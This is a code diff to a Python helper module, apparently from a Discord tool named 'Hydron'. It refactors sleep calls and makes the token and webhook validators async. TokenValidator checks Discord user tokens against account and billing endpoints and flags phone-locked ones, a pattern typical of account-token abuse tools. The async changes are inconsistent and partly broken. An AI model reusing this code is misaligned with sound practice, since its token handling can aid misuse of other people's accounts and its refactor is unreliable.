@@ -1,17 +1,19 @@
 import os
+import importlib
 from typing import ClassVar, Final, Literal, Optional  # <-- 시스템 명령어를 쓸 일이 많음
-from colorama import Fore  # <-- 디자인(배경 X 글씨 O)
-import requests  # <-- 웹페이지에 요청을 보낼 때 헤더가 필요한데 얘가 좀 도움이 됨
 import ctypes
-
-from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
-
 import io, sys, random, json
 import re
 import zipfile
+import time
 from urllib.request import urlopen, urlretrieve
 from distutils.version import LooseVersion
-from time import sleep
+
+from colorama import Fore  # <-- 디자인(배경 X 글씨 O)
+import requests  # <-- 웹페이지에 요청을 보낼 때 헤더가 필요한데 얘가 좀 도움이 됨
+
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+
 
 ###### 버전 지정 ######
 
@@ -161,13 +163,13 @@ def get_driver():
         "chromedriver.exe"
     ]  # 우리는 구글파로 들어간다.(오페라, 익스플로러는 나중에 완성하고 나서 추가적으로 만들 예정)
     Write.Print("\n설치된 드라이버 확인중!", Colors.blue_to_cyan, interval=0.015)
-    sleep(0.052)
+    time.sleep(0.052)
     for driver in driverList:  # 드라이브 리스트에 설치 되어있는 목록들 체킹
         if os.path.exists(os.getcwd() + os.sep + driver):  # os.sep = '\\'
             Write.Print(
                 "\n크롬 드라이버가 이미 설치되어 있음!", Colors.blue_to_cyan, interval=0.015
             )  # 만약 현재 폴더에 드라이버가 있다면
-            sleep(0.5)
+            time.sleep(0.5)
             return driver  # 드라이버 이름 리턴
         else:  # 드라이버 설치...
             Write.Print(
@@ -209,17 +211,17 @@ def LoadingAnimation():
     for i in loading_iconlist:
         sys.stdout.write(f"""\r{ly}[{lbl}#{ly}]{w} 로딩중... {i}""")
         sys.stdout.flush()
-        sleep(0.1)
+        time.sleep(0.1)
 
 
 def PrintAnimation(letters: str):  # 글자를 애니메이션화 하여 출력
     for letter in letters:
         sys.stdout.write(letter)
         sys.stdout.flush()
-        sleep(0.25)  # 0.25초씩 딜레이 주면서 추력
+        time.sleep(0.25)  # 0.25초씩 딜레이 주면서 추력
 
 
-def TokenValidator(token: str):  # 토큰이 유효한지 검사하는 discord api
+async def TokenValidator(token: str):  # 토큰이 유효한지 검사하는 discord api
     """내가 제작한 코드가 아니라, discord api뒤져서 가져옴"""
     base_url = "https://discord.com/api/v9/users/@me"
     message = "You need to verify your account in order to perform this action."
@@ -227,14 +229,14 @@ def TokenValidator(token: str):  # 토큰이 유효한지 검사하는 discord a
     r = requests.get(base_url, headers=heads(token))
     if r.status_code != 200:
         print(f"\n{Fore.RED}존재하지 않는 토큰입니다!{Fore.RESET}")
-        sleep(1)
-        __import__("main").Hydron()
+        time.sleep(1)
+        await importlib.import_module("main").Hydron()
     j = requests.get(f"{base_url}/billing/subscriptions", headers=heads(token)).json()
     try:
         if j["message"] == message:
             print(f"\n{Fore.RED}폰 락된 토큰입니다!{Fore.RESET}")
-            sleep(1)
-            __import__("main").Hydron()
+            time.sleep(1)
+            await importlib.import_module("main").Hydron()
     except TypeError:
         pass
 
@@ -331,11 +333,11 @@ def getTemp() -> str | Literal[-1]:  # temp 폴더 경로 복사
         return os.getenv("temp", -1)
 
 
-def validateWebhook(hook: str):  # 웹훅 볼리데이터
+async def validateWebhook(hook: str):  # 웹훅 볼리데이터
     if "api/webhooks" not in hook:
         print(f"\n{Fore.RED}존재하지 않는 웹훅입니다!{Fore.RESET}")
-        sleep(1)
-        __import__("Hydron").main()
+        time.sleep(1)
+        await importlib.import_module("main").Hydron()
     try:
         responce = requests.get(hook)
     except (
@@ -344,13 +346,13 @@ def validateWebhook(hook: str):  # 웹훅 볼리데이터
         requests.exceptions.ConnectionError,
     ):
         print(f"\n{Fore.RED}존재하지 않는 웹훅입니다!{Fore.RESET}")
-        sleep(1)
+        time.sleep(1)
         __import__("Hydron").main()
     try:
         j = responce.json()["name"]
     except (KeyError, json.decoder.JSONDecodeError):
         print(f"\n{Fore.RED}존재하지 않는 웹훅입니다!{Fore.RESET}")
-        sleep(1)
+        time.sleep(1)
         __import__("Hydron").main()
     print(f"{Fore.GREEN}존재하는 웹훅입니다! ({j})")
 
